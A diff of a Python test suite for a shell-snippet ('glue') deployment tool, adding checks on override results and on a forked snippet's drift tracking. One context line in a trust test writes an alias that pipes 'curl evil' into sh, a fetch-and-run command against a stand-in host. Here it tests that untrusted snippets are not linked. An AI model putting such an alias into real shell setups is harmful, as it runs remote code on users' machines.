@@ -528,7 +528,8 @@ def test_override_forks_shipped_glue_and_reports_drift(tmp_path):
     rc = ResolvedComponent(key='glue\\btop-glue', driver='glue', comp='btop-glue',
                            fields={'glue': 'btop'}, source=str(p.glue_dir.parent / 'routes.hu'))
     forked = g.override(rc)
-    assert forked == [(p.user_glue_dir / 'shell' / 'bash' / 'btop.sh', 'bash')]
+    assert forked == [(p.user_glue_dir / 'shell' / 'bash' / 'btop.sh', 'bash', True)]
+    assert g.override(rc)[0][2] is False                             # a re-run: it already exists
     override = forked[0][0]
     assert override.read_text() == 'alias b=btop\n' and not os.access(override, os.X_OK)
     assert g.override_drift(rc) == []                                # source unchanged -> no drift
@@ -806,6 +807,26 @@ def test_an_untrusted_primarys_user_glue_is_not_linked(tmp_path):
     snippet.write_text('alias m="curl evil | sh"\n')                 # the primary moves on
     g.deploy_user_glue('bash')
     assert not link.is_symlink()                                     # its old link goes too
+
+
+def test_re_override_after_bless_reuses_the_local_fork_and_clears_its_drift(tmp_path):
+    # a fork made before a primary was blessed lives in the local store (and shadows the primary);
+    # re-running override must find THAT fork — no second copy in the primary — and record the
+    # shipped hash on it, or its stale hash keeps the drift warning up forever
+    p, pdir = _primary(tmp_path)
+    ship = p.glue_dir / 'shell' / 'bash'
+    ship.mkdir(parents=True)
+    (ship / 'btop.sh').write_text('alias b=btop\n')
+    rc = ResolvedComponent(key='glue\\btop-glue', driver='glue', comp='btop-glue',
+                           fields={'glue': 'btop'}, source=str(p.glue_dir.parent / 'routes.hu'))
+    g = Glue(Runner(pretend=False), p)
+    (local,) = g.override(rc, local=True)                            # before the bless: local
+    (ship / 'btop.sh').write_text('alias b=btop  # v2\n')            # the shipped source moves on
+    assert g.override_drift(rc)
+    again = g.override(rc)                                           # primary now the default dest
+    assert again == [(local[0], 'bash', False)]
+    assert not (pdir / 'glue' / 'shell' / 'bash' / 'btop.sh').exists()
+    assert g.override_drift(rc) == []                                # the hash landed on the fork
 
 
 def test_a_primary_override_of_a_repo_snippet_needs_the_primarys_trust(tmp_path):
